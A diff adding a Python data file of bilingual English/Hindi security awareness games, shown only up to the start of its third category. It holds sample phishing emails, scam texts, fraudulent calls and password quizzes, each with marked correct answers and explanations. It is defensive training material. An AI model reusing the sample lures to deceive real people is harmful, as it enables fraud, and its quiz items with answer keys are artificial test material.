@@ -1,0 +1,1118 @@
+"""Catalogue of 30 Comprehensive Cybersecurity Awareness Games.
+
+Categories:
+A: Social Engineering (Games 1-6)
+B: Identity and Password Security (Games 7-11)
+C: Network and Web Security (Games 12-17)
+D: Malware and Incident Response (Games 18-23)
+E: Privacy and Security Operations (Games 24-30)
+
+Every game includes realistic scenarios, beginner/intermediate/advanced levels,
+scoring, explanations, warning signs, and bilingual English/Hindi content.
+"""
+
+from __future__ import annotations
+
+GAMES_30: list[dict] = [
+    # =========================================================================
+    # CATEGORY A — SOCIAL ENGINEERING
+    # =========================================================================
+    {
+        "slug": "phishing-detective",
+        "title_en": "Phishing Detective",
+        "title_hi": "फ़िशिंग डिटेक्टिव",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Analyze incoming emails for subtle spoofing indicators, deceptive sender addresses, urgency triggers, and concealed links before taking action.",
+        "instructions_hi": "कार्रवाई करने से पहले सूक्ष्म स्पूफिंग संकेतक, भ्रामक प्रेषक पते, तात्कालिकता और छिपे हुए लिंक के लिए आने वाले ईमेल का विश्लेषण करें।",
+        "debrief_en": "Phishing attacks exploit human trust and urgency. Always verify the sender domain character by character and inspect links before clicking.",
+        "debrief_hi": "फ़िशिंग हमले मानवीय विश्वास और जल्दबाजी का फायदा उठाते हैं। हमेशा प्रेषक डोमेन को ध्यान से जांचें और क्लिक करने से पहले लिंक की पुष्टि करें।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 1,
+        "scenarios": [
+            {
+                "type": "email",
+                "sender": "Payroll Support <payroll@company-payrolldesk.com>",
+                "subject": "Urgent: Direct Deposit Account Verification Needed Before Midnight",
+                "body": "Dear Employee,\n\nOur automated payroll batch flagged an invalid routing number for your monthly direct deposit. To prevent a 30-day salary freeze, click below to re-verify your banking credentials immediately:\n\nhttp://login.company-payrolldesk.com/update-auth\n\nHuman Resources Financial Operations",
+                "is_threat": True,
+                "explanation_en": "The domain company-payrolldesk.com is an unapproved external domain mimicking internal payroll. Legitimate HR teams do not issue midnight salary freeze ultimatums.",
+                "explanation_hi": "यह डोमेन आंतरिक पेरोल की नकल कर रहा है। वैध एचआर टीमें आधी रात तक वेतन रोकने की धमकी नहीं देतीं।",
+                "warning_signs_en": "Artificial urgency, external lookalike domain, threatening financial consequence.",
+                "warning_signs_hi": "कृत्रिम तात्कालिकता, बाहरी नकली डोमेन, वित्तीय रोक की धमकी।",
+                "choices": [
+                    ("Click the link to verify banking info right away", False, "Never enter banking details on unverified third-party links.", "सत्यापित न किए गए लिंक पर कभी भी बैंकिंग विवरण दर्ज न करें।"),
+                    ("Report as phishing and confirm with HR via official internal portal", True, "Excellent! Reporting and verifying via official channels protects payroll.", "बहुत बढ़िया! आधिकारिक माध्यमों से रिपोर्ट करना सबसे सुरक्षित है।"),
+                    ("Reply with your bank account number and IFSC", False, "Severe security risk: Never send financial credentials in plain text.", "गंभीर जोखिम: कभी भी सादे पाठ में वित्तीय क्रेडेंशियल न भेजें।")
+                ]
+            },
+            {
+                "type": "email",
+                "sender": "IT Helpdesk <support@internal-corp.net>",
+                "subject": "Scheduled Maintenance Notice: VPN Gateway Rotation",
+                "body": "Team,\n\nPlease be advised that secondary VPN node #2 will undergo routine patch maintenance on Saturday 02:00 UTC. No password resets or credential entries are required. Status will be visible on the internal intranet dashboard.",
+                "is_threat": False,
+                "explanation_en": "This is a routine administrative advisory that asks for no action, no links, and no passwords.",
+                "explanation_hi": "यह एक सामान्य प्रशासनिक सूचना है जिसमें कोई पासवर्ड या लिंक नहीं मांगा गया है।",
+                "warning_signs_en": "None. Informational announcement with no credential harvesting.",
+                "warning_signs_hi": "कोई नहीं। बिना किसी क्रेडेंशियल अनुरोध के सूचनात्मक घोषणा।",
+                "choices": [
+                    ("Flag as a malicious attack and panic", False, "Not every maintenance email is an attack.", "हर रखरखाव ईमेल हमला नहीं होता।"),
+                    ("Verify internally and acknowledge routine schedule", True, "Correct: This is a legitimate internal advisory.", "सही: यह एक वैध आंतरिक सलाह है।"),
+                    ("Send your VPN credentials to the sender", False, "Never volunteer passwords to any notice.", "किसी भी नोटिस पर पासवर्ड न दें।")
+                ]
+            },
+            {
+                "type": "email",
+                "sender": "Executive Office <ceo-urgent-reply@mail-secure-relay.org>",
+                "subject": "Confidential Project: Need 5 Google Play Gift Cards for Partner Meeting",
+                "body": "I am in a closed-door client meeting and cannot pick up phone calls. I need you to purchase 5x $100 Google Play gift cards for the delegates right now and email me the scratched codes. Keep this strictly between us.",
+                "is_threat": True,
+                "explanation_en": "Classic CEO gift card fraud. Executives will never ask employees to secretly purchase gift cards with scratched codes.",
+                "explanation_hi": "सीईओ गिफ्ट कार्ड घोटाला। वरिष्ठ अधिकारी कभी भी गुप्त रूप से गिफ्ट कार्ड खरीदने के लिए नहीं कहेंगे।",
+                "warning_signs_en": "Isolation request ('cannot pick up phone'), secretive instructions, gift card demand.",
+                "warning_signs_hi": "फ़ोन न उठाने का बहाना, गुप्त रखने का निर्देश, गिफ्ट कार्ड की मांग।",
+                "choices": [
+                    ("Run to the nearest store to buy the cards quickly", False, "You would lose money to a scammer.", "आप धोखेबाज के हाथों पैसे गंवा देंगे।"),
+                    ("Report to Infosec immediately and call CEO through corporate directory", True, "Spot on! Out-of-band verification exposes executive impersonation.", "बिल्कुल सही! स्वतंत्र पुष्टि करने से धोखाधड़ी उजागर होती है।"),
+                    ("Ask the sender which store has the best discount", False, "This validates your email to the attacker.", "यह हमलावर को पुष्टि करता है कि आप झांसे में आ रहे हैं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "smishing-showdown",
+        "title_en": "Smishing Showdown",
+        "title_hi": "स्मिशिंग शोडाउन",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Inspect simulated SMS messages claiming delivery failures, bank suspensions, and lottery rewards. Spot malicious shorteners and fraudulent numbers.",
+        "instructions_hi": "डिलीवरी विफलता, बैंक निलंबन और लॉटरी पुरस्कार का दावा करने वाले नकली एसएमएस संदेशों की पहचान करें।",
+        "debrief_en": "SMS phishing often uses URL shorteners to obscure fake destinations. Never enter bank credentials or OTPs following an SMS link.",
+        "debrief_hi": "एसएमएस फ़िशिंग अक्सर लिंक छुपाने के लिए शॉर्टनर का उपयोग करती है। एसएमएस लिंक पर कभी भी बैंक विवरण न दें।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 2,
+        "scenarios": [
+            {
+                "type": "sms",
+                "sender": "+1 (800) 555-0199 / FAST-POST",
+                "subject": "Delivery Exception Notice",
+                "body": "[Postal Express]: Your package #US-88219 has an incomplete address and cannot be delivered today. Update your address & pay $1.49 redelivery fee within 12h: https://bit.ly/postal-re-deliv",
+                "is_threat": True,
+                "explanation_en": "Package delivery smishing uses tiny fees as bait to capture full credit card details and identity data via unvetted bit.ly links.",
+                "explanation_hi": "पार्सल डिलीवरी स्मिशिंग मामूली शुल्क के बहाने क्रेडिट कार्ड डेटा चुराने का प्रयास करती है।",
+                "warning_signs_en": "Shortened bit.ly URL, unsolicited package notice, credit card fee requirement.",
+                "warning_signs_hi": "शॉर्ट यूआरएल, अवांछित पार्सल सूचना, कार्ड शुल्क की मांग।",
+                "choices": [
+                    ("Open link and pay $1.49 immediately", False, "The attacker will steal your full credit card number and CVV.", "हमलावर आपका क्रेडिट कार्ड नंबर और सीवीवी चुरा लेगा।"),
+                    ("Delete SMS and check tracking only on official postal website", True, "Correct! Legitimate carriers do not withhold packages over tiny bit.ly fees.", "सही! आधिकारिक ट्रैकिंग वेबसाइट पर सीधे जांचना ही सही तरीका है।"),
+                    ("Text back with your full residential address and SSN", False, "Never reply with personal identifiers.", "व्यक्तिगत जानकारी कभी भी एसएमएस में न भेजें।")
+                ]
+            },
+            {
+                "type": "sms",
+                "sender": "VM-SBISEC",
+                "subject": "Banking Alert",
+                "body": "Dear Customer, Your NetBanking account will be blocked today due to pending PAN update. Click http://sbi-pan-kyc-verify.in to update now.",
+                "is_threat": True,
+                "explanation_en": "Banks never request PAN or KYC verification through unofficial HTTP web addresses sent over SMS.",
+                "explanation_hi": "बैंक कभी भी एसएमएस में भेजे गए अनौपचारिक वेब पते के जरिए पैन या केवाईसी अपडेट नहीं मांगते।",
+                "warning_signs_en": "HTTP instead of HTTPS, non-bank domain (.in redirect), account blockage threat.",
+                "warning_signs_hi": "एचटीटीपी लिंक, गैर-बैंकिंग डोमेन, खाता ब्लॉक करने की धमकी।",
+                "choices": [
+                    ("Click the link to prevent account blockage", False, "Traps you into a fake credential harvesting portal.", "यह आपको नकली बैंकिंग पोर्टल पर फंसा देगा।"),
+                    ("Forward message to 1930 / bank cyber fraud cell and ignore link", True, "Perfect! Reporting to the cyber fraud helpline protects others as well.", "शानदार! साइबर अपराध सेल में शिकायत करना सही कदम है।"),
+                    ("Call the sender phone number to give your OTP", False, "Never share OTPs with unverified phone callers.", "अज्ञात कॉलर को कभी ओटीपी न दें।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "vishing-challenge",
+        "title_en": "Vishing Challenge",
+        "title_hi": "विशिंग चैलेंज",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Handle incoming high-pressure phone calls claiming to be from corporate IT, law enforcement, or fraud prevention teams.",
+        "instructions_hi": "कॉर्पोरेट आईटी, पुलिस या बैंक फ्रॉड टीम होने का दावा करने वाले संदिग्ध फोन कॉलों की पहचान करें।",
+        "debrief_en": "Caller ID is easily spoofed. When a caller demands remote desktop access or immediate passwords, hang up and call back via an established internal number.",
+        "debrief_hi": "कॉलर आईडी आसानी से बदली जा सकती है। जब कोई रिमोट एक्सेस या पासवर्ड मांगे, तो फोन काटकर आधिकारिक नंबर पर कॉल करें।",
+        "difficulty": "intermediate",
+        "timed": True,
+        "xp": 40,
+        "order_index": 3,
+        "scenarios": [
+            {
+                "type": "call",
+                "sender": "Caller: 'David from Global IT Infrastructure'",
+                "subject": "Urgent Ransomware Containment Procedure",
+                "body": "'Hi! This is David from IT Tier 3. We have detected anomalous crypto-traffic leaving your workstation right now. Do not reboot! Quickly download AnyDesk or TeamViewer and give me the 9-digit connection code so I can isolate the infection.'",
+                "is_threat": True,
+                "explanation_en": "Vishing scammers create panic to coerce users into installing remote-access trojans (RATs) giving full machine takeover.",
+                "explanation_hi": "विशिंग स्कैमर रिमोट डेस्कटॉप सॉफ्टवेयर इंस्टॉल कराकर कंप्यूटर पर पूरा नियंत्रण पाने का प्रयास करते हैं।",
+                "warning_signs_en": "Caller creates panic, demands third-party remote desktop software, bypasses official ticketing.",
+                "warning_signs_hi": "घबराहट पैदा करना, रिमोट सॉफ्टवेयर की मांग, आधिकारिक टिकटिंग से बचना।",
+                "choices": [
+                    ("Launch AnyDesk and read out the connection pin", False, "Grants the attacker unfiltered remote control of your computer.", "हमलावर को आपके पूरे सिस्टम का रिमोट कंट्रोल मिल जाएगा।"),
+                    ("Politely decline, hang up, and call internal IT on their known corporate extension", True, "Excellent! Always verify caller identity out-of-band via verified internal numbers.", "उत्कृष्ट! हमेशा आधिकारिक आंतरिक नंबर पर वापस कॉल करके पुष्टि करें।"),
+                    ("Give them your workstation Windows login password instead", False, "Catastrophic security failure: never disclose passwords on calls.", "गंभीर भूल: कभी भी फोन पर पासवर्ड न बताएं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "impersonation-trap",
+        "title_en": "Impersonation Trap",
+        "title_hi": "इम्पर्सनेशन ट्रैप",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Identify vendor impersonation, Business Email Compromise (BEC), and unauthorized bank account modification requests.",
+        "instructions_hi": "विक्रेता प्रतिरूपण और बैंक खाता विवरण बदलने के धोखाधड़ी अनुरोधों की पहचान करें।",
+        "debrief_en": "Vendor email compromise costs organizations billions annually. Never modify invoice wire payment details without voice verification with the vendor's CFO.",
+        "debrief_hi": "विक्रेता खाता धोखाधड़ी से भारी नुकसान होता है। पुष्टि किए बिना चालान भुगतान विवरण कभी न बदलें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 4,
+        "scenarios": [
+            {
+                "type": "email",
+                "sender": "Apex Cloud Systems Accounts <invoicing@apex-c1oud.com>",
+                "subject": "Updated Remittance Details for Outstanding Invoice #INV-99042",
+                "body": "Hi Finance Team,\n\nOur primary receiving bank is undergoing annual compliance audit. Please route payment for the overdue $48,200 invoice to our new escrow partner account listed on the attached PDF. Confirm when wire is dispatched.",
+                "is_threat": True,
+                "explanation_en": "The domain apex-c1oud.com uses digit '1' in place of letter 'l' (typosquatting). The sudden bank change request is textbook BEC fraud.",
+                "explanation_hi": "डोमेन में 'l' की जगह '1' का उपयोग किया गया है। बैंक खाता बदलने का अचानक अनुरोध बीईसी धोखाधड़ी है।",
+                "warning_signs_en": "Typosquatted domain (c1oud), sudden changes to bank remittance instructions.",
+                "warning_signs_hi": "नकली डोमेन (c1oud), अचानक बैंक खाता बदलने का निर्देश।",
+                "choices": [
+                    ("Update the account and release the $48,200 wire immediately", False, "Funds would be permanently wired to an offshore criminal syndicate.", "धन स्थायी रूप से अपराधियों के खाते में चला जाएगा।"),
+                    ("Hold the payment, call the vendor's registered procurement liaison, and report typosquatting", True, "Flawless! Strict verification of bank changes prevents wire fraud.", "बिल्कुल सही! स्वतंत्र फोन सत्यापन से वित्तीय धोखाधड़ी रुकती है।"),
+                    ("Reply to the email asking if the new bank is safe", False, "The attacker controls the mailbox and will gladly reply 'yes'.", "हमलावर खुद ही उत्तर देकर कहेगा कि सब ठीक है।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "bait-or-truth",
+        "title_en": "Bait or Truth",
+        "title_hi": "चारा या सच्चाई",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Distinguish between legitimate software updates, open-source resources, and malicious bait such as cracked tools or trojanized torrents.",
+        "instructions_hi": "वैध सॉफ्टवेयर अपडेट और दुर्भावनापूर्ण क्रैक्ड टूल्स या वायरस युक्त फाइलों के बीच अंतर करें।",
+        "debrief_en": "Malware authors rely on tempting lures like free premium software or cracked games to bypass defensive controls.",
+        "debrief_hi": "हमलावर सुरक्षा को बायपास करने के लिए मुफ्त सॉफ्टवेयर या क्रैक्ड टूल्स का लालच देते हैं।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 5,
+        "scenarios": [
+            {
+                "type": "page",
+                "sender": "Web Portal: FreeCyberTools-Unlimited.ru",
+                "subject": "Download Burp Suite Pro & IDA Pro Unlimited Keygen [100% Free]",
+                "body": "Click 'Download Installer' to bypass enterprise licensing! Please disable Windows Defender and AntiVirus before extraction to prevent false positives.",
+                "is_threat": True,
+                "explanation_en": "Requesting users to disable antivirus is a guaranteed red flag indicating an infostealer or ransomware payload.",
+                "explanation_hi": "एंटीवायरस बंद करने का अनुरोध सीधे मैलवेयर या रैनसमवेयर का संकेत है।",
+                "warning_signs_en": "Request to disable antivirus, pirated commercial software, unverified Russian domain.",
+                "warning_signs_hi": "एंटीवायरस बंद करने का अनुरोध, पायरेटेड सॉफ्टवेयर, संदिग्ध डोमेन।",
+                "choices": [
+                    ("Disable antivirus and run setup.exe as Administrator", False, "Your entire system and network credentials will be compromised.", "आपका सिस्टम और क्रेडेंशियल पूरी तरह से हैक हो जाएंगे।"),
+                    ("Close tab immediately and obtain tools through authorized procurement", True, "Spot on! Commercial software must always come from licensed vendors.", "सही! सॉफ्टवेयर केवल अधिकृत और लाइसेंसीकृत स्रोत से ही लेना चाहिए।"),
+                    ("Upload the keygen to your company Google Drive to share with coworkers", False, "Spreads the infection across company assets.", "यह कंपनी के नेटवर्क में संक्रमण फैला देगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "deepfake-detective",
+        "title_en": "Deepfake Detective",
+        "title_hi": "डीपफेक डिटेक्टिव",
+        "category": "social_engineering",
+        "category_title_en": "Social Engineering",
+        "category_title_hi": "सोशल इंजीनियरिंग",
+        "instructions_en": "Spot artificial intelligence voice synthesis, deepfake video calls, and synthetic audio distress scams.",
+        "instructions_hi": "एआई वॉइस क्लोनिंग और डीपफेक वीडियो कॉल घोटालों की बारीकियों को पहचानें।",
+        "debrief_en": "AI can replicate voices in seconds with short audio samples. Establish pre-agreed family or corporate code words for high-risk actions.",
+        "debrief_hi": "एआई कुछ ही सेकंड में आवाज की नकल कर सकता है। संवेदनशील कार्यों के लिए हमेशा पूर्व-निर्धारित कोडवर्ड का उपयोग करें।",
+        "difficulty": "advanced",
+        "timed": False,
+        "xp": 50,
+        "order_index": 6,
+        "scenarios": [
+            {
+                "type": "call",
+                "sender": "WhatsApp Audio: 'Chief Operating Officer'",
+                "subject": "Secret Acquisition Authorization",
+                "body": "The audio message sounds exactly like your COO, complete with her cadence. She says: 'I am in Zurich for the emergency acquisition. Wire $250,000 to the Swiss notary account immediately. Do not mention this in Slack.' Notice slight metallic distortion and robotic breathing rhythms.",
+                "is_threat": True,
+                "explanation_en": "Deepfake audio often exhibits acoustic artifacts like robotic background jitter and avoidance of standard communication protocols.",
+                "explanation_hi": "डीपफेक आवाज में अक्सर कृत्रिम विसंगतियां और मानक संचार प्रोटोकॉल से बचने की कोशिश होती है।",
+                "warning_signs_en": "Metallic acoustic distortion, avoidance of Slack/email, secret emergency wire request.",
+                "warning_signs_hi": "आवाज में धातु जैसी विकृति, आधिकारिक चैनलों से बचना, गुप्त धन अंतरण की मांग।",
+                "choices": [
+                    ("Authorize the wire immediately based on the familiar voice", False, "Classic executive deepfake scam that has stolen millions.", "यह डीपफेक स्कैम है जिससे करोड़ों का नुकसान हो सकता है।"),
+                    ("Demand challenge-response code or verify in person via secondary executive line", True, "Masterful! Verifying with pre-established verification protocols stops AI vishing.", "उत्कृष्ट! पूर्व-निर्धारित सत्यापन प्रोटोकॉल से एआई धोखाधड़ी रुकती है।"),
+                    ("Post the audio to public social media to ask if it's real", False, "Leaks sensitive company discussions publicly.", "कंपनी की गोपनीय चर्चा को सार्वजनिक कर देगा।")
+                ]
+            }
+        ]
+    },
+
+    # =========================================================================
+    # CATEGORY B — IDENTITY AND PASSWORD SECURITY
+    # =========================================================================
+    {
+        "slug": "password-fortress",
+        "title_en": "Password Fortress",
+        "title_hi": "पासवर्ड फोर्ट्रेस",
+        "category": "identity_security",
+        "category_title_en": "Identity & Passwords",
+        "category_title_hi": "पहचान और पासवर्ड",
+        "instructions_en": "Evaluate passphrases against entropy, dictionary vulnerabilities, substitution traps, and credential stuffing vectors.",
+        "instructions_hi": "पासवर्ड की मजबूती, डिक्शनरी हमलों और क्रेडेंशियल स्टफिंग के खिलाफ सुरक्षा का मूल्यांकन करें।",
+        "debrief_en": "Length and randomness trump short complex passwords. Passphrases composed of four or more random words resist brute-force cracking.",
+        "debrief_hi": "लंबे और यादृच्छिक पासवर्ड छोटे लेकिन जटिल पासवर्ड से बेहतर होते हैं। कई यादृच्छिक शब्दों के वाक्यांश सबसे सुरक्षित होते हैं।",
+        "difficulty": "beginner",
+        "timed": False,
+        "xp": 35,
+        "order_index": 7,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Password Policy Engine",
+                "subject": "Selecting Your Master Account Passphrase",
+                "body": "Select the strongest, most resilient credential for your privileged account:\nA: 'Password@2024!'\nB: 'P@$$w0rd'\nC: 'correct-horse-battery-staple-ocean'\nD: 'Admin1234'",
+                "is_threat": False,
+                "explanation_en": "C has over 65 bits of cryptographic entropy and is immune to predictable substitution attacks, whereas A, B, and D are in top rockyou wordlists.",
+                "explanation_hi": "विकल्प C में सबसे अधिक एंट्रॉपी है और यह शब्दकोश हमलों से सुरक्षित है।",
+                "warning_signs_en": "Avoid predictable substitutions like @ for a, or standard words + year.",
+                "warning_signs_hi": "अनुमानित अक्षरों जैसे @ या वर्ष जोड़ने से बचें।",
+                "choices": [
+                    ("Option A: 'Password@2024!'", False, "Standard dictionary word + year cracked in under 3 seconds.", "डिक्शनरी शब्द और वर्ष 3 सेकंड में क्रैक हो जाते हैं।"),
+                    ("Option B: 'P@$$w0rd'", False, "Leetspeak substitution is indexed in every password cracking dictionary.", "यह लीटस्पीक हर हैकिंग डिक्शनरी में मौजूद है।"),
+                    ("Option C: 'correct-horse-battery-staple-ocean'", True, "Correct! Long multi-word passphrases provide supreme entropy.", "बिल्कुल सही! लंबे बहु-शब्द वाक्यांश उच्चतम सुरक्षा देते हैं।"),
+                    ("Option D: 'Admin1234'", False, "Extremely weak; cracked instantly by automated bots.", "अत्यंत कमजोर; बॉट इसे तुरंत क्रैक कर देते हैं।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "mfa-guardian",
+        "title_en": "MFA Guardian",
+        "title_hi": "एमएफए गार्जियन",
+        "category": "identity_security",
+        "category_title_en": "Identity & Passwords",
+        "category_title_hi": "पहचान और पासवर्ड",
+        "instructions_en": "Defend against MFA push fatigue attacks, SIM swapping indicators, and session cookie hijacking.",
+        "instructions_hi": "एमएफए पुश बॉम्बिंग और सिम स्वैपिंग हमलों से सुरक्षा की तकनीक सीखें।",
+        "debrief_en": "Never approve an unexpected 2FA push notification. If your phone receives repeated prompts, an attacker knows your password. Change it immediately.",
+        "debrief_hi": "अचानक आए 2FA पुश नोटिफिकेशन को कभी स्वीकार न करें। अगर बार-बार प्रॉम्प्ट आए, तो तुरंत पासवर्ड बदलें।",
+        "difficulty": "intermediate",
+        "timed": True,
+        "xp": 40,
+        "order_index": 8,
+        "scenarios": [
+            {
+                "type": "page",
+                "sender": "Mobile Authenticator App",
+                "subject": "Push Notification Spam (MFA Fatigue Attack)",
+                "body": "It is 03:15 AM. Your phone rings repeatedly with 42 consecutive push notifications: 'Are you signing in to Okta from Frankfurt, Germany? [Approve] / [Deny]'. A minute later, a WhatsApp message says: 'Please approve the push to stop the ringing.'",
+                "is_threat": True,
+                "explanation_en": "This is an MFA Fatigue (Push Bombing) attack. The attacker already possesses your password and is tormenting you until you hit Approve.",
+                "explanation_hi": "यह एमएफए पुश बॉम्बिंग हमला है। हमलावर के पास आपका पासवर्ड है और वह अप्रूव दबाने का इंतजार कर रहा है।",
+                "warning_signs_en": "Late-night unsolicited prompts, foreign geographic location, WhatsApp message coercion.",
+                "warning_signs_hi": "असमय नोटिफिकेशन, विदेशी स्थान, व्हाट्सएप पर दबाव।",
+                "choices": [
+                    ("Click Approve just to silence the phone and go back to sleep", False, "Catastrophic! The attacker gains full access to your corporate account.", "घातक भूल! हमलावर को आपके खाते का पूरा नियंत्रण मिल जाएगा।"),
+                    ("Click Deny, report fraud to SecOps immediately, and change your password", True, "Flawless! Denying the prompt and immediately rotating your password terminates the threat.", "उत्कृष्ट! अस्वीकार करके तुरंत पासवर्ड बदलना ही सही उपाय है।"),
+                    ("Turn phone on airplane mode and ignore forever", False, "The attacker still has your valid password and will keep trying.", "हमलावर के पास आपका पासवर्ड बना रहेगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "account-recovery-rescue",
+        "title_en": "Account Recovery Rescue",
+        "title_hi": "अकाउंट रिकवरी रेस्क्यू",
+        "category": "identity_security",
+        "category_title_en": "Identity & Passwords",
+        "category_title_hi": "पहचान और पासवर्ड",
+        "instructions_en": "Protect security recovery mechanisms against social engineering and OSINT reconnaissance.",
+        "instructions_hi": "सोशल मीडिया से व्यक्तिगत जानकारी चुराकर सुरक्षा प्रश्नों को बायपास करने से रोकें।",
+        "debrief_en": "Security questions based on real facts like mother's maiden name or high school are easily discoverable on social media. Treat recovery answers like passwords.",
+        "debrief_hi": "सुरक्षा प्रश्न सोशल मीडिया से खोजे जा सकते हैं। रिकवरी उत्तरों को भी पासवर्ड की तरह यादृच्छिक रखें।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 9,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Cloud Provider Identity Portal",
+                "subject": "Setting Up Secondary Security Questions",
+                "body": "When configuring 'What was your first pet's name?' or 'What high school did you attend?', how should you respond?",
+                "is_threat": False,
+                "explanation_en": "Factual answers can be scraped from Facebook, LinkedIn, or voter registries. Using synthetic random passphrases stored in a password manager prevents account takeover.",
+                "explanation_hi": "तथ्यात्मक उत्तर सोशल मीडिया से खोजे जा सकते हैं। पासवर्ड मैनेजर में सहेजे गए यादृच्छिक उत्तर सुरक्षित होते हैं।",
+                "warning_signs_en": "Public personal facts are easily discovered by OSINT investigators.",
+                "warning_signs_hi": "सार्वजनिक व्यक्तिगत जानकारी आसानी से खोजी जा सकती है।",
+                "choices": [
+                    ("Use your real dog's name that you post about on Instagram weekly", False, "OSINT tools will scrape your dog's name in seconds.", "हैकर इंस्टाग्राम से आपके पालतू का नाम तुरंत खोज लेंगे।"),
+                    ("Use a synthetic, randomized password-manager generated passphrase", True, "Spot on! Treating recovery questions as secondary passwords guarantees safety.", "सही! रिकवरी प्रश्नों को भी यादृच्छिक पासवर्ड की तरह मानें।"),
+                    ("Share the answers on Facebook so your family can recover your account", False, "Allows anyone on the internet to take over your account.", "इंटरनेट पर कोई भी आपके खाते पर कब्जा कर लेगा।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "credential-leak-detective",
+        "title_en": "Credential Leak Detective",
+        "title_hi": "क्रेडेंशियल लीक डिटेक्टिव",
+        "category": "identity_security",
+        "category_title_en": "Identity & Passwords",
+        "category_title_hi": "पहचान और पासवर्ड",
+        "instructions_en": "Respond to enterprise data breach notifications and credential correlation across personal and professional environments.",
+        "instructions_hi": "डेटा लीक होने की सूचना मिलने पर सही कदम उठाने की प्रक्रिया सीखें।",
+        "debrief_en": "Password reuse across multiple services turns one minor vendor leak into a complete corporate compromise.",
+        "debrief_hi": "विभिन्न खातों में एक ही पासवर्ड रखने से एक सेवा लीक होने पर सभी खाते खतरे में पड़ जाते हैं।",
+        "difficulty": "intermediate",
+        "timed": False,
+        "xp": 40,
+        "order_index": 10,
+        "scenarios": [
+            {
+                "type": "email",
+                "sender": "HaveIBeenPwned Automated Alert <notify@haveibeenpwned.com>",
+                "subject": "Breach Notice: Your work email appeared in a 1.2M record combo list",
+                "body": "Your email user@enterprise.com and a hashed password from a third-party webinar site were discovered in a public breach dump. What is your immediate incident response sequence?",
+                "is_threat": False,
+                "explanation_en": "Immediate rotation of all reused passwords, review of active sessions, and checking MFA status prevents credential stuffing.",
+                "explanation_hi": "सभी साझा पासवर्ड तुरंत बदलना और सक्रिय सत्रों की समीक्षा करना सही कदम है।",
+                "warning_signs_en": "Notice from a verified leak detection monitor.",
+                "warning_signs_hi": "सत्यापित डेटा लीक सूचना।",
+                "choices": [
+                    ("Ignore it because the leak came from an external webinar site", False, "If you reused the password anywhere, attackers are already testing it.", "यदि आपने पासवर्ड दोबारा इस्तेमाल किया है तो हमलावर उसे आजमा रहे हैं।"),
+                    ("Immediately rotate credentials everywhere, revoke existing sessions, and notify SecOps", True, "Exceptional! Fast remediation contains credential stuffing campaigns.", "उत्कृष्ट! तुरंत पासवर्ड बदलकर सक्रिय सत्र समाप्त करना सही है।"),
+                    ("Change your email address to avoid getting breach emails", False, "Does not fix the underlying credential compromise.", "यह मूल सुरक्षा समस्या को हल नहीं करता।")
+                ]
+            }
+        ]
+    },
+    {
+        "slug": "access-control-master",
+        "title_en": "Access Control Master",
+        "title_hi": "एक्सेस कंट्रोल मास्टर",
+        "category": "identity_security",
+        "category_title_en": "Identity & Passwords",
+        "category_title_hi": "पहचान और पासवर्ड",
+        "instructions_en": "Enforce Principle of Least Privilege (PoLP) and detect privilege creep in enterprise directories.",
+        "instructions_hi": "न्यूनतम विशेषाधिकार सिद्धांत (PoLP) लागू करें और अनावश्यक अनुमतियों की पहचान करें।",
+        "debrief_en": "Never grant domain admin or root privileges for routine daily work. Always practice just-in-time and least-privilege access.",
+        "debrief_hi": "दैनिक कार्यों के लिए कभी भी रूट या व्यवस्थापक अधिकार न दें। हमेशा न्यूनतम आवश्यक अधिकार ही दें।",
+        "difficulty": "advanced",
+        "timed": False,
+        "xp": 50,
+        "order_index": 11,
+        "scenarios": [
+            {
+                "type": "decision",
+                "sender": "Identity & Access Governance Board",
+                "subject": "Contractor Permission Request Review",
+                "body": "A short-term graphic design contractor requests 'Domain Admin' and 'S3 Full Access' to upload a banner logo to the marketing website. What is the correct security posture?",
+                "is_threat": True,
+                "explanation_en": "Violates Principle of Least Privilege. Graphic designers require scoped read/write access to one specific marketing bucket prefix, never domain admin.",
+                "explanation_hi": "यह न्यूनतम विशेषाधिकार का उल्लंघन है। डिजाइनर को केवल विशिष्ट एस3 बकेट का अधिकार मिलना चाहिए।",
+                "warning_signs_en": "Excessive administrative privilege request for low-tier operational tasks.",
+                "warning_signs_hi": "सामान्य कार्य के लिए अत्यधिक व्यवस्थापकीय अधिकारों की मांग।",
+                "choices": [
+                    ("Approve the request to avoid blocking project timelines", False, "Massive security violation risking full domain compromise.", "गंभीर उल्लंघन जिससे पूरा डोमेन खतरे में पड़ जाएगा।"),
+                    ("Reject Domain Admin and provision scoped IAM role limited to specific marketing asset path", True, "Correct! Least privilege restricts blast radius if the contractor account is breached.", "सही! सीमित अनुमतियां देने से सुरक्षा बनी रहती है।"),
+                    ("Give them the root AWS credentials directly via Slack", False, "Severe violation of corporate security policies.", "कंपनी सुरक्षा नीतियों का घोर उल्लंघन।")
+                ]
+            }
+        ]
+    },
+
+    # =========================================================================
+    # CATEGORY C — NETWORK AND WEB SECURITY
+    # =========================================================================
+    {
